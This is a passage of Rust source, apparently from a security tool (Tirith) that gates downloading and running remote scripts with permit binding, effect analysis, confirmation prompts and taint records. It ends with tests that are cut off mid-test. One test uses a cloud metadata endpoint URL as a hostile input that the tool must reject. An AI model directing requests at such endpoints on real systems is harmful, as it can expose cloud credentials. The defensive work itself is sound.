    F: FnOnce(
        crate::task_boundary::PendingBoundaryAuthorization<
            crate::task_boundary::RemoteScriptRunBoundary,
        >,
    ) -> Result<
        crate::task_boundary::TaskBoundaryPermit<crate::task_boundary::RemoteScriptRunBoundary>,
        crate::task_boundary::BoundaryAuthorizationError,
    >,
{
    // Syntax, literal-IP policy, pin shape, and transport policy are pure and
    // run before replay consumption. Domain DNS is deliberately deferred until
    // after authorization so a denied request cannot resolve its target.
    let request = preflight_download_request(url, expected_sha256, purpose)?;
    let runner_binding = remote_run_boundary_binding(
        url,
        expected_sha256,
        purpose == DownloadPurpose::SaveOnly,
        requested_pipe_invocation,
    )?;
    let runner_operation = runner_binding.operation();
    if !pending.binds_operation(operation) || !pending.binds_operation(&runner_operation) {
        return Err(
            "remote-script authorization does not bind the exact validated download operation"
                .to_string(),
        );
    }
    let permit = consume(pending).map_err(|error| {
        format!("remote-script authorization failed immediately before download: {error}")
    })?;
    if !permit.binds_operation(operation) || !permit.binds_operation(&runner_operation) {
        return Err(
            "remote-script authorization does not bind the exact validated download operation"
                .to_string(),
        );
    }
    let transaction =
        AuthorizedRemoteRunTransaction::begin(permit, runner_binding, chrono::Utc::now())?;
    // First DNS lookup. The guarded reqwest resolver independently repeats the
    // destination policy at connect time and for every redirect hop.
    let request = validate_download_destination(request)?;
    Ok((request, transaction))
}

fn remote_launch_effects(
    content: &[u8],
    invocation: &ScriptInvocation,
    cwd: Option<&Path>,
    policy_identity: &str,
) -> Result<crate::task::InferredEffects, String> {
    let content = std::str::from_utf8(content)
        .map_err(|_| "live remote launch content is not valid UTF-8".to_string())?;
    let Some((shell, command_semantics, _)) = interpreter_analysis(&invocation.interpreter) else {
        return Ok(crate::task::InferredEffects {
            effects: Default::default(),
            complete: false,
        });
    };
    if !command_semantics {
        // The task effect grammar is a command grammar. Running Python, Ruby,
        // Perl, or JavaScript through it would create false semantic facts;
        // leave those languages explicitly incomplete instead.
        return Ok(crate::task::InferredEffects {
            effects: Default::default(),
            complete: false,
        });
    }
    let action = crate::task::ProposedAction::Shell {
        command: content.to_string(),
    };
    let analysis =
        crate::task_analysis::TaskAnalysisContext::trusted(shell, cwd, Some(policy_identity));
    Ok(crate::task::infer_effects_detailed_with_context(
        &action, &analysis,
    ))
}

fn prepare_remote_launch_authorization(
    content: &[u8],
    content_sha256: &str,
    invocation: &ScriptInvocation,
    cwd: Option<&Path>,
    policy: &crate::policy::Policy,
) -> Result<PreparedRemoteLaunchAuthorization, String> {
    if sha256_hex(content) != content_sha256 {
        return Err(
            "remote-script launch content does not match its immutable SHA-256 binding".to_string(),
        );
    }
    let policy_identity = policy.enforcement_projection_hash();
    let inferred = remote_launch_effects(content, invocation, cwd, &policy_identity)?;
    let input_mode = match invocation.input_mode {
        ScriptInputMode::File => "file",
        ScriptInputMode::Stdin => "stdin",
    };
    let projection = serde_json::json!({
        "projection_version": 1,
        "content_sha256": content_sha256,
        "interpreter": invocation.interpreter.as_str(),
        "argv": &invocation.args,
        "input_mode": input_mode,
        "policy_identity": policy_identity.as_str(),
        "effects": &inferred.effects,
        "effect_analysis_complete": inferred.complete,
    });
    let projection_sha256 =
        sha256_hex(crate::audit::canonical_json_for_hash(&projection).as_bytes());
    let mut actions = Vec::new();
    if !inferred.complete {
        // This compact action carries no attacker bytes, but deliberately
        // preserves incompleteness so an enforcing `action_incomplete_analysis`
        // policy still controls a language or shell construct Tirith could not
        // model completely.
        actions.push(crate::task::ProposedAction::Narrative {
            text: format!("remote-launch-analysis-incomplete:{projection_sha256}"),
        });
    }
    let binding = RemoteLaunchBinding {
        envelope: crate::task::TaskEnvelopeInput {
            task_id: None,
            sources: vec![crate::task::TaskSourceInput {
                claimed_source: crate::task::SourceKind::Unknown,
                content: format!("remote-launch-v1:{projection_sha256}"),
                locator: None,
                receipt: None,
            }],
            actions,
            requested_effects: inferred.effects.clone(),
        },
        effects: inferred.effects,
    };
    let operation = binding.operation();
    let authorization = crate::task_boundary::prepare_locally_derived_boundary_authorization::<
        crate::task_boundary::RemoteScriptRunBoundary,
    >(
        &operation,
        &policy.task_gate,
        &crate::task_analysis::TaskAnalysisContext::default(),
    );
    let assessment = match &authorization {
        Ok(pending) => Some(pending.assessment()),
        Err(error) => error.assessment(),
    };
    if let Some(assessment) = assessment {
        if let Err(error) = crate::audit::log_task_boundary_assessment(assessment) {
            crate::audit::audit_diagnostic(format!("task-boundary audit append failed: {error}"));
        }
    }
    let authorization = authorization
        .map_err(|error| format!("remote-script launch authorization refused: {error}"))?;
    Ok(PreparedRemoteLaunchAuthorization {
        binding,
        authorization,
    })
}

fn consume_remote_launch_authorization(
    prepared: PreparedRemoteLaunchAuthorization,
    now: chrono::DateTime<chrono::Utc>,
) -> Result<AuthorizedRemoteLaunch, String> {
    let PreparedRemoteLaunchAuthorization {
        binding,
        authorization,
    } = prepared;
    let operation = binding.operation();
    if !authorization.binds_operation(&operation) {
        return Err(
            "remote-script launch authorization binding changed before execution".to_string(),
        );
    }
    let permit = authorization
        .consume_default(now)
        .map_err(|error| format!("remote-script launch authorization refused: {error}"))?;
    if !permit.binds_operation(&operation) {
        return Err(
            "remote-script launch authorization binding changed before execution".to_string(),
        );
    }
    Ok(AuthorizedRemoteLaunch {
        _binding: binding,
        _permit: permit,
    })
}

fn run_impl<'operation, 'envelope>(
    opts: RunOptions,
    requested_pipe_invocation: Option<RequestedPipeInvocation>,
    verified_executor: Option<&VerifiedScriptExecutor>,
    remote_authorization: Option<(
        crate::task_boundary::PendingBoundaryAuthorization<
            crate::task_boundary::RemoteScriptRunBoundary,
        >,
        &'operation crate::task_boundary::BoundaryOperation<'envelope>,
    )>,
) -> Result<RunResult, String> {
    if !opts.no_exec && !opts.interactive {
        return Err("tirith run requires an interactive terminal or --no-exec flag".to_string());
    }
    #[cfg(not(target_os = "linux"))]
    if !opts.no_exec {
        return Err(
            "content-bound script execution is supported only on Linux: other hosts expose no \
             complete-tree primitive for descendants that can call setsid(); refusing before \
             download, approval, or interpreter launch"
                .to_string(),
        );
    }
    if !opts.no_exec && verified_executor.is_none() {
        return Err(
            "live script execution requires the trusted kernel exec-stop controller; refusing before download"
                .to_string(),
        );
    }
    let resolved_pipe_executable = if let Some(requested) = requested_pipe_invocation.as_ref() {
        if verified_executor.is_none() {
            return Err(
                "a forced stdin interpreter is accepted only with fail-closed capsule execution"
                    .to_string(),
            );
        }
        if !pipe_interpreter_args_supported(requested.interpreter, &requested.args) {
            return Err(format!(
                "unsupported argv for forced stdin interpreter '{}'",
                requested.interpreter
            ));
        }
        let executable =
            crate::trusted_child::resolve_forced_interpreter(requested.interpreter.as_str())
                .map_err(|error| {
                    format!(
                        "cannot select trusted stdin interpreter '{}': {error}",
                        requested.interpreter
                    )
                })?;
        Some(if opts.no_exec {
            executable
        } else {
            executable.bind_content().map_err(|error| {
                format!(
                    "cannot bind trusted stdin interpreter '{}' before download: {error}",
                    requested.interpreter
                )
            })?
        })
    } else {
        None
    };
    let purpose = if opts.no_exec {
        DownloadPurpose::SaveOnly
    } else {
        DownloadPurpose::Execute
    };
    let (downloaded, remote_transaction) = if let Some((pending, operation)) = remote_authorization
    {
        let (request, transaction) = validate_and_authorize_remote_download(
            &opts.url,
            opts.expected_sha256.as_deref(),
            purpose,
            requested_pipe_invocation.as_ref(),
            pending,
            operation,
            |pending| pending.consume_default(chrono::Utc::now()),
        )?;
        let downloaded = download_bounded_authorized(request, purpose, &transaction)?;
        (downloaded, Some(transaction))
    } else {
        let request =
            validate_download_request(&opts.url, opts.expected_sha256.as_deref(), purpose)?;
        (download_bounded_validated(request, purpose)?, None)
    };
    let content = downloaded.content;
    let sha256 = downloaded.sha256;

    let cache_dir = crate::policy::data_dir()
        .ok_or("cannot determine data directory")?
        .join("cache");
    fs::create_dir_all(&cache_dir).map_err(|e| format!("create cache: {e}"))?;
    let cached_path = cache_dir.join(&sha256);
    if let Some(transaction) = remote_transaction.as_ref() {
        persist_cache_entry_authorized(&cache_dir, &cached_path, &content, transaction)?;
    } else {
        persist_cache_entry(&cache_dir, &cached_path, &content)?;
    }

    let cwd = std::env::current_dir().ok();
    let forced_interpreter = requested_pipe_invocation
        .as_ref()
        .map(|requested| requested.interpreter.as_str());
    let mut review = review_script_bytes(
        &content,
        !opts.no_exec,
        opts.interactive,
        cwd.as_deref(),
        forced_interpreter,
    )?;
    // Incomplete no-exec analyses have no engine policy, but their public
    // receipt still needs an authoritative full-policy DLP projection. Resolve
    // it once here (including remote replacement/runtime overrides) rather
    // than falling back to an empty pattern set at the DTO boundary.
    if review.policy.is_none() {
        let cwd_for_policy = cwd.as_ref().map(|path| path.to_string_lossy().into_owned());
        let policy = crate::policy::Policy::discover(cwd_for_policy.as_deref());
        crate::policy::freeze_captured_policy_dlp_patterns(&policy.dlp_custom_patterns);
        review.policy = Some(policy);
    }
    let mut invocation = if let Some(requested) = requested_pipe_invocation.as_ref() {
        ScriptInvocation {
            interpreter: requested.interpreter.as_str().to_string(),
            resolved_executable: resolved_pipe_executable.clone(),
            args: requested.args.clone(),
            input_mode: ScriptInputMode::Stdin,
        }
    } else {
        ScriptInvocation {
            interpreter: review.interpreter.clone(),
            resolved_executable: None,
            args: Vec::new(),
            input_mode: ScriptInputMode::File,
        }
    };
    // Keep the legacy allowlist as a second, explicit execution gate. The
    // analyzer table is intentionally no broader than this list, but both must
    // agree before an interpreter is invoked.
    if !opts.no_exec && !is_allowed_interpreter(&invocation.interpreter) {
        return Err(format!(
            "interpreter '{}' is not in the allowed list",
            invocation.interpreter
        ));
    }
    if !opts.no_exec && invocation.resolved_executable.is_none() {
        let selected = crate::trusted_child::resolve_forced_interpreter(&invocation.interpreter)
            .map_err(|error| {
                format!(
                    "cannot select trusted script interpreter '{}': {error}",
                    invocation.interpreter
                )
            })?;
        invocation.resolved_executable = Some(selected.bind_content().map_err(|error| {
            format!(
                "cannot bind trusted script interpreter '{}' before approval: {error}",
                invocation.interpreter
            )
        })?);
    }
    #[cfg(target_os = "linux")]
    if !opts.no_exec {
        require_native_bound_interpreter(&invocation)?;
    }

    let bypass_requested = std::env::var("TIRITH").ok().as_deref() == Some("0");
    let preview_bypass_honored = if let Some(policy) = review.policy.clone() {
        // A generated `safe_command` is an enforcement boundary, not a user
        // request to weaken policy. Preserve `bypass_requested` for audit, but
        // make bypass unavailable for the typed stdin runner surface.
        let surface_allows_bypass = requested_pipe_invocation.is_none();
        apply_explicit_bypass(
            &mut review,
            &policy,
            bypass_requested,
            opts.interactive,
            surface_allows_bypass,
            !opts.no_exec,
        )
    } else {
        false
    };

    let receipt = Receipt {
        url: opts.url.clone(),
        final_url: Some(downloaded.final_url),
        redirects: downloaded.redirects,
        sha256: sha256.clone(),
        size: content.len() as u64,
        domains_referenced: review.legacy.domains_referenced.clone(),
        paths_referenced: review.legacy.paths_referenced.clone(),
        analysis_method: if review.analysis_complete {
            format!("policy-complete:{}", review.interpreter)
        } else {
            format!(
                "static-incomplete:{}",
                review.incomplete_reason.unwrap_or("unknown")
            )
        },
        privilege: if review.legacy.has_sudo {
            "elevated".to_string()
        } else {
            "normal".to_string()
        },
        timestamp: chrono::Utc::now().to_rfc3339(),
        cwd: cwd.as_ref().map(|p| p.display().to_string()),
        // Receipt collection must not execute ambient PATH helpers. Git metadata
        // stays absent until it can be derived without spawning an unbound tool.
        git_repo: None,
        git_branch: None,
    };

    let audit_subject = format!("downloaded-script sha256:{sha256}");
    let preview_result_verdict = redacted_result_verdict(&review);
    if let Some(effective) = review.effective_verdict.as_ref() {
        let custom_patterns = &review
            .policy
            .as_ref()
            .expect("an effective runner verdict retains its frozen policy")
            .dlp_custom_patterns;
        // Pass the complete raw verdict into the renderer. It derives its
        // bounded/redacted display internally while retaining a same-finding
        // raw target for advisory integrity.
        present_complete_verdict(effective, custom_patterns, std::io::stderr().lock())?;
    }

    if opts.no_exec {
        if let Some(effective) = review.effective_verdict.as_ref() {
            audit_complete_review(&review, effective, &audit_subject, false)?;
        }
        if let Some(transaction) = remote_transaction.as_ref() {
            save_remote_receipt_authorized(&receipt, transaction)?;
        } else {
            receipt.save().map_err(|e| format!("save receipt: {e}"))?;
        }
        return Ok(RunResult {
            receipt,
            verdict: preview_result_verdict,
            analysis_complete: review.analysis_complete,
            refused: false,
            executed: false,
            exit_code: None,
        });
    }

    let blocked = review
        .effective_verdict
        .as_ref()
        .is_some_and(|verdict| verdict.action == Action::Block);
    let approval_required = review
        .effective_verdict
        .as_ref()
        .is_some_and(|verdict| verdict.requires_approval == Some(true));
    // `tirith run` has no approval-completion flow. Its local y/N confirmation
    // is not a substitute for the policy approval contract, and TIRITH=0 may not
    // bypass it. Refuse before the generic prompt and before materialization.
    if approval_required || (blocked && !preview_bypass_honored) {
        if approval_required {
            eprintln!(
                "tirith: execution refused: policy approval is required and this runner has no approval-completion flow"
            );
        }
        if let Some(effective) = review.effective_verdict.as_ref() {
            audit_complete_review(&review, effective, &audit_subject, false)?;
        }
        if let Some(transaction) = remote_transaction.as_ref() {
            save_remote_receipt_authorized(&receipt, transaction)?;
        } else {
            receipt.save().map_err(|e| format!("save receipt: {e}"))?;
        }
        return Ok(RunResult {
            receipt,
            verdict: preview_result_verdict,
            analysis_complete: review.analysis_complete,
            refused: true,
            executed: false,
            exit_code: Some(Action::Block.exit_code()),
        });
    }
    eprintln!(
        "tirith: downloaded {} bytes (SHA256: {})",
        content.len(),
        crate::receipt::short_hash(&sha256)
    );
    eprintln!("tirith: interpreter: {}", invocation.interpreter);
    if invocation.input_mode == ScriptInputMode::Stdin {
        eprintln!("tirith: script input: stdin");
    }
    if !invocation.args.is_empty() {
        eprintln!("tirith: interpreter argv: {:?}", invocation.args);
    }
    if preview_bypass_honored {
        eprintln!(
            "tirith: preview blocking verdict is eligible for explicit TIRITH=0 bypass; the final decision will be re-audited after confirmation"
        );
    }

    let tty = fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open("/dev/tty")
        .map_err(|_| "cannot open /dev/tty for confirmation")?;

    let displayed_effective = review
        .effective_verdict
        .as_ref()
        .ok_or_else(|| "live execution has no complete displayed verdict".to_string())?
        .clone();
    let warnings_acknowledged =
        matches!(displayed_effective.action, Action::Warn | Action::WarnAck);
    let prompt = if warnings_acknowledged {
        "Execute this script and acknowledge the displayed warnings? [y/N] "
    } else {
        "Execute this script? [y/N] "
    };
    if !read_tty_confirmation(&tty, prompt)? {
        eprintln!("tirith: execution cancelled");
        audit_complete_review(&review, &displayed_effective, &audit_subject, false)?;
        if let Some(transaction) = remote_transaction.as_ref() {
            save_remote_receipt_authorized(&receipt, transaction)?;
        } else {
            receipt.save().map_err(|e| format!("save receipt: {e}"))?;
        }
        return Ok(RunResult {
            receipt,
            verdict: preview_result_verdict,
            analysis_complete: review.analysis_complete,
            refused: false,
            executed: false,
            exit_code: None,
        });
    }

    if let Some(transaction) = remote_transaction.as_ref() {
        save_remote_receipt_authorized(&receipt, transaction)?;
    } else {
        receipt.save().map_err(|e| format!("save receipt: {e}"))?;
    }

    // Confirmation is never an authorization of the preview snapshot. Re-run
    // the complete engine over the exact immutable bytes and selected
    // interpreter, reload policy/live state, and freeze a fresh strict decision.
    let session_id = crate::session::resolve_session_id();
    let surface_allows_bypass = requested_pipe_invocation.is_none();
    let ConfirmedScriptReview {
        review: final_review,
        prepared,
        bypass_honored: final_bypass_honored,
    } = prepare_confirmed_script_review(
        &content,
        opts.interactive,
        cwd.as_deref(),
        &invocation.interpreter,
        bypass_requested,
        surface_allows_bypass,
        &session_id,
    )?;
    let final_policy = final_review
        .policy
        .as_ref()
        .expect("confirmed complete analysis retains its frozen policy");
    let final_result_verdict =
        redacted_verdict(prepared.verdict(), &final_policy.dlp_custom_patterns);
    present_complete_verdict(
        prepared.verdict(),
        &final_policy.dlp_custom_patterns,
        std::io::stderr().lock(),
    )?;
    audit_complete_review(
        &final_review,
        prepared.verdict(),
        &audit_subject,
        prepared.verdict().bypass_honored,
    )?;
    if (prepared.verdict().action == Action::Block && !prepared.verdict().bypass_honored)
        || prepared.verdict().requires_approval == Some(true)
    {
        return Ok(RunResult {
            receipt,
            verdict: Some(final_result_verdict),
            analysis_complete: final_review.analysis_complete,
            refused: true,
            executed: false,
            exit_code: Some(Action::Block.exit_code()),
        });
    }
    if final_bypass_honored {
        eprintln!(
            "tirith: final blocking body verdict explicitly bypassed via TIRITH=0 (durably audited with raw findings)"
        );
    }
    let prepared = if prepared.requires_warn_ack() {
        match prepared.bind_runner_confirmation(&displayed_effective, warnings_acknowledged) {
            Ok(prepared) => prepared,
            Err(error) => {
                eprintln!("tirith: execution refused: {error}");
                return Ok(RunResult {
                    receipt,
                    verdict: Some(final_result_verdict),
                    analysis_complete: final_review.analysis_complete,
                    refused: true,
                    executed: false,
                    exit_code: Some(Action::Block.exit_code()),
                });
            }
        }
    } else {
        prepared
    };
    let launch_authorization = prepare_remote_launch_authorization(
        &content,
        &sha256,
        &invocation,
        cwd.as_deref(),
        final_policy,
    )?;
    // Never execute the stable content-addressed cache path. Materialize the
    // reviewed in-memory bytes into a fully sealed anonymous descriptor and
    // verify its digest through that still-open descriptor before acquiring the
    // session gate. The gate's bounded promotion window is reserved for the
    // trusted spawn plus stopped-target authorization protocol, not local
    // content materialization.
    let execution = materialize_execution_file(&cache_dir, &content, &sha256)?;
    let execution_bytes = execution.read_verified(content.len(), &sha256)?;
    let reviewed_script = execution.reviewed(&execution_bytes);
    let draft = prepared.into_authorizable_draft()?;
    // This is distinct from the pre-download network authorization: it binds
    // the now-known immutable bytes, final interpreter/argv/mode, final policy,
    // and semantic effect result. Consume it only after every local launch
    // preparation succeeded and retain it across the sole executor call.
    let launch_permit =
        consume_remote_launch_authorization(launch_authorization, chrono::Utc::now())?;
    let gate = crate::execution_state::ExecutionGate::acquire(
        draft,
        crate::execution_state::DEFAULT_GATE_LOCK_TIMEOUT,
    )?;
    let mut authorizer = ExecutionAuthorizer::new(gate, launch_permit);
    let exec = verified_executor.expect("live executor checked before download");
    let exit_code = Some(execute_verified_remote_script(
        remote_transaction.as_ref(),
        exec,
        &invocation,
        reviewed_script,
        &mut authorizer,
    )?);
    if !authorizer.completed() {
        return Err(
            "trusted executor returned without completing observed -> durable commit -> ACK -> resumed -> EOF authorization"
                .to_string(),
        );
    }

    Ok(RunResult {
        receipt,
        verdict: Some(final_result_verdict),
        analysis_complete: final_review.analysis_complete,
        refused: false,
        executed: true,
        exit_code,
    })
}

fn execute_verified_remote_script(
    download_authorization: Option<&AuthorizedRemoteRunTransaction>,
    executor: &VerifiedScriptExecutor,
    invocation: &ScriptInvocation,
    reviewed_script: ReviewedScript<'_>,
    authorizer: &mut ExecutionAuthorizer,
) -> Result<i32, String> {
    // Tirith's owned CLI path always supplies the retained download transaction.
    // `None` exists only for the explicitly compatible library entry points;
    // their boundary ownership remains outside the CLI contract.
    if let Some(authorization) = download_authorization {
        authorization.authorize_effect_at(chrono::Utc::now())?;
    }
    executor(invocation, reviewed_script, authorizer)
}

/// Outcome of [`download_to_path`].
pub struct DownloadResult {
    /// The path the content was written to (the caller-supplied destination).
    pub path: std::path::PathBuf,
    /// SHA-256 of the downloaded content.
    pub sha256: String,
    /// Final URL after redirects.
    pub final_url: String,
    /// Number of bytes written.
    pub size: u64,
    /// Detected interpreter from the shebang (best-effort, for display).
    pub interpreter: String,
}

/// Result of the typed command-card cache transaction.
pub struct CachedCommandCardResult {
    pub path: std::path::PathBuf,
    pub sha256: String,
    pub final_url: String,
}

/// Download `url` to `dest` WITHOUT executing it (the primitive behind
/// `tirith fetch --save`). Shares [`run`]'s redirect / 30s-timeout / 10 MiB-cap
/// policy, verifies `expected_sha256`, and writes atomically (sibling temp +
/// rename, `0600`). Caller marks `dest` tainted (see `crate::taint`).
pub fn download_to_path(
    url: &str,
    dest: &std::path::Path,
    expected_sha256: Option<&str>,
) -> Result<DownloadResult, String> {
    let downloaded = download_bounded(url, expected_sha256, DownloadPurpose::SaveOnly)?;
    persist_download_to_path(downloaded, dest)
}

/// Tirith-owned `fetch --save` transaction. Pure request validation happens
/// before replay consumption; DNS, HTTP, the atomic destination write, and its
/// durable taint record all occur while the exact typed permit remains alive.
pub fn download_to_path_and_mark_tainted_authorized<'operation, 'envelope>(
    url: &str,
    dest: &std::path::Path,
    expected_sha256: Option<&str>,
    pending: crate::task_boundary::PendingBoundaryAuthorization<
        crate::task_boundary::RemoteScriptRunBoundary,
    >,
    operation: &'operation crate::task_boundary::BoundaryOperation<'envelope>,
) -> Result<(DownloadResult, crate::taint::TaintEntry), String> {
    let absolute_dest = std::path::absolute(dest)
        .map_err(|error| format!("resolve absolute fetch destination: {error}"))?;
    let request = preflight_download_request(url, expected_sha256, DownloadPurpose::SaveOnly)?;
    let binding = remote_fetch_save_boundary_binding(url, &absolute_dest, expected_sha256)?;
    let reconstructed = binding.operation();
    if !pending.binds_operation(operation) || !pending.binds_operation(&reconstructed) {
        return Err(
            "fetch-save authorization does not bind the exact URL, pin, and destination"
                .to_string(),
        );
    }
    let permit = pending
        .consume_default(chrono::Utc::now())
        .map_err(|error| format!("fetch-save authorization failed before download: {error}"))?;
    if !permit.binds_operation(operation) || !permit.binds_operation(&reconstructed) {
        return Err(
            "fetch-save authorization does not bind the exact URL, pin, and destination"
                .to_string(),
        );
    }
    let transaction = AuthorizedRemoteRunTransaction::begin(permit, binding, chrono::Utc::now())?;
    let request = validate_download_destination(request)?;
    let downloaded = download_bounded_authorized(request, DownloadPurpose::SaveOnly, &transaction)?;
    transaction.authorize_effect_at(chrono::Utc::now())?;
    // Provenance is made durable before publication. A later destination-write
    // failure can leave a conservative stale mark, but a taint-store failure
    // can never leave downloaded bytes published as apparently clean.
    let taint = crate::taint::mark_tainted(
        &absolute_dest,
        "fetch --save",
        Some(downloaded.final_url.clone()),
        None,
    )
    .map_err(|error| {
        format!(
            "refusing to publish {} because mandatory taint provenance could not be recorded: {error}",
            absolute_dest.display()
        )
    })?;
    transaction.authorize_effect_at(chrono::Utc::now())?;
    let destination = transaction
        .binding
        .destination()
        .ok_or_else(|| "fetch authorization lost its retained destination".to_string())?;
    let result =
        persist_download_to_contained(downloaded, &absolute_dest, destination, &transaction)?;
    Ok((result, taint))
}

/// Download, validate, and content-address one command card while retaining an
/// exact remote-download permit across DNS, HTTP, temp creation, and cache
/// publication. No cache directory or temp file is created before consumption.
pub fn download_and_cache_command_card_authorized<'operation, 'envelope>(
    url: &str,
    cache_dir: &std::path::Path,
    card_read_cap: u64,
    pending: crate::task_boundary::PendingBoundaryAuthorization<
        crate::task_boundary::RemoteScriptRunBoundary,
    >,
    operation: &'operation crate::task_boundary::BoundaryOperation<'envelope>,
) -> Result<CachedCommandCardResult, String> {
    let absolute_cache = std::path::absolute(cache_dir)
        .map_err(|error| format!("resolve absolute command-card cache root: {error}"))?;
    let request = preflight_download_request(url, None, DownloadPurpose::SaveOnly)?;
    let binding = remote_command_card_cache_boundary_binding(url, &absolute_cache, card_read_cap)?;
    let reconstructed = binding.operation();
    if !pending.binds_operation(operation) || !pending.binds_operation(&reconstructed) {
        return Err(
            "command-card fetch authorization does not bind the exact URL and cache destination"
                .to_string(),
        );
    }
    let permit = pending
        .consume_default(chrono::Utc::now())
        .map_err(|error| format!("command-card fetch authorization failed: {error}"))?;
    if !permit.binds_operation(operation) || !permit.binds_operation(&reconstructed) {
        return Err(
            "command-card fetch authorization does not bind the exact URL and cache destination"
                .to_string(),
        );
    }
    let transaction = AuthorizedRemoteRunTransaction::begin(permit, binding, chrono::Utc::now())?;
    let request = validate_download_destination(request)?;
    let downloaded = download_bounded_authorized(request, DownloadPurpose::SaveOnly, &transaction)?;
    if downloaded.content.len() as u64 > card_read_cap {
        return Err(format!(
            "downloaded card is {} bytes, exceeding the {card_read_cap}-byte read cap; not caching",
            downloaded.content.len()
        ));
    }
    crate::command_card::Card::from_json(&downloaded.content).map_err(|_| {
        "downloaded content is not a valid command card (JSON parse failed)".to_string()
    })?;

    let destination = absolute_cache.join(format!("{}.json", downloaded.sha256));
    let cache_root = transaction
        .binding
        .destination()
        .ok_or_else(|| "command-card authorization lost its retained cache root".to_string())?;
    let file_name = destination
        .file_name()
        .ok_or_else(|| "content-addressed command-card path has no filename".to_string())?;
    transaction.authorize_effect_at(chrono::Utc::now())?;
    let cache_file = cache_root
        .prepare_child(file_name, true)
        .map_err(|error| format!("bind command-card cache destination: {error}"))?;
    cache_file
        .write_atomic_checked(&downloaded.content, true, || {
            transaction
                .authorize_effect_at(chrono::Utc::now())
                .map_err(std::io::Error::other)
        })
        .map_err(|error| format!("persist command card {}: {error}", destination.display()))?;
    Ok(CachedCommandCardResult {
        path: destination,
        sha256: downloaded.sha256,
        final_url: downloaded.final_url,
    })
}

fn persist_download_to_path(
    downloaded: DownloadedBytes,
    dest: &std::path::Path,
) -> Result<DownloadResult, String> {
    let content = downloaded.content;
    let sha256 = downloaded.sha256;

    // Atomic write: sibling temp + rename, 0600.
    let dir = dest.parent().filter(|p| !p.as_os_str().is_empty());
    if let Some(parent) = dir {
        fs::create_dir_all(parent).map_err(|e| format!("create dest dir: {e}"))?;
    }
    let tmp_dir = dir.unwrap_or_else(|| std::path::Path::new("."));
    {
        use tempfile::NamedTempFile;
        let mut tmp = NamedTempFile::new_in(tmp_dir).map_err(|e| format!("tempfile: {e}"))?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            tmp.as_file()
                .set_permissions(std::fs::Permissions::from_mode(0o600))
                .map_err(|e| format!("permissions: {e}"))?;
        }
        tmp.write_all(&content)
            .map_err(|e| format!("write download: {e}"))?;
        // fsync bytes before rename so a crash can't leave a partial file at dest.
        tmp.as_file()
            .sync_all()
            .map_err(|e| format!("sync download: {e}"))?;
        tmp.persist(dest)
            .map_err(|e| format!("persist download: {e}"))?;
        // Also fsync the parent dir so the rename survives a crash (CodeRabbit
        // R9 #B). Best-effort: a dir-fsync failure is logged not propagated (R13 #5).
        crate::util::fsync_parent_dir_logged(dest, "downloaded script");
    }

    let content_str = String::from_utf8_lossy(&content);
    let interpreter = script_analysis::detect_interpreter(&content_str).to_string();

    Ok(DownloadResult {
        path: dest.to_path_buf(),
        sha256,
        final_url: downloaded.final_url,
        size: content.len() as u64,
        interpreter,
    })
}

fn persist_download_to_contained(
    downloaded: DownloadedBytes,
    display_path: &std::path::Path,
    destination: &crate::util::ContainedAtomicFile,
    authorization: &AuthorizedRemoteRunTransaction,
) -> Result<DownloadResult, String> {
    destination
        .write_atomic_checked(&downloaded.content, true, || {
            authorization
                .authorize_effect_at(chrono::Utc::now())
                .map_err(std::io::Error::other)
        })
        .map_err(|error| format!("persist download: {error}"))?;
    let size = downloaded.content.len() as u64;
    let interpreter =
        script_analysis::detect_interpreter(&String::from_utf8_lossy(&downloaded.content))
            .to_string();
    Ok(DownloadResult {
        path: display_path.to_path_buf(),
        sha256: downloaded.sha256,
        final_url: downloaded.final_url,
        size,
        interpreter,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    #[cfg(unix)]
    use std::process::Command;

    fn pending_remote_script_authorization<'a>(
        operation: &crate::task_boundary::BoundaryOperation<'a>,
    ) -> crate::task_boundary::PendingBoundaryAuthorization<
        crate::task_boundary::RemoteScriptRunBoundary,
    > {
        crate::task_boundary::prepare_locally_derived_boundary_authorization::<
            crate::task_boundary::RemoteScriptRunBoundary,
        >(
            operation,
            &crate::web3_policy::TaskGatePolicy::default(),
            &crate::task_analysis::TaskAnalysisContext::default(),
        )
        .expect("default receiptless remote-script authorization")
    }

    #[test]
    fn authorized_remote_runner_rejects_an_operation_swap_before_download() {
        let authorized_binding =
            remote_run_boundary_binding("https://1.1.1.1/a.sh", None, true, None).unwrap();
        let authorized_operation = authorized_binding.operation();
        let pending = pending_remote_script_authorization(&authorized_operation);

        let substituted_binding =
            remote_run_boundary_binding("https://8.8.8.8/b.sh", None, true, None).unwrap();
        let substituted_operation = substituted_binding.operation();
        let result = run_with_authorized_verified_executor(
            RunOptions {
                url: "https://8.8.8.8/b.sh".to_string(),
                no_exec: true,
                interactive: false,
                expected_sha256: None,
                exec_fn: None,
            },
            None,
            pending,
            &substituted_operation,
            Box::new(|_, _, _| panic!("--no-exec invoked an executor")),
        );
        let error = match result {
            Ok(_) => panic!("a permit authorized a substituted operation"),
            Err(error) => error,
        };
        assert!(error.contains("does not bind the exact validated download operation"));
    }

    #[test]
    fn invalid_remote_requests_do_not_reach_replay_consumption() {
        for (url, pin, expected_error) in [
            ("not a URL", None, "invalid URL"),
            (
                "https://example.test/a.sh",
                Some("bad-pin"),
                "invalid SHA-256 pin",
            ),
            (
                "https://169.254.169.254/a.sh",
                None,
                "cloud metadata endpoint",
            ),
        ] {
            let binding =
                remote_run_boundary_binding("https://1.1.1.1/placeholder", None, true, None)
                    .unwrap();
            let operation = binding.operation();
            let pending = pending_remote_script_authorization(&operation);
            let consumed = std::cell::Cell::new(false);
            let result = validate_and_authorize_remote_download(
                url,
                pin,
                DownloadPurpose::SaveOnly,
                None,
                pending,
                &operation,
                |_| {
                    consumed.set(true);
                    panic!("invalid request reached replay consumption")
                },
            );
            let error = match result {
                Ok(_) => panic!("invalid request unexpectedly validated"),
                Err(error) => error,
            };
            assert!(error.contains(expected_error), "{error}");
            assert!(!consumed.get(), "invalid request consumed replay state");
        }
    }

    #[test]
    fn remote_authorization_binds_pin_purpose_and_pipe_argv_before_consumption() {
        let pin_a = "11".repeat(32);
        let pin_b = "22".repeat(32);
        let requested = RequestedPipeInvocation {
            interpreter: PipeInterpreter::Sh,
            args: vec!["-s".to_string(), "--".to_string()],
        };
        let binding = remote_run_boundary_binding(
            "https://1.1.1.1/script",
            Some(&pin_a),
            false,
            Some(&requested),
        )
        .unwrap();
        let operation = binding.operation();

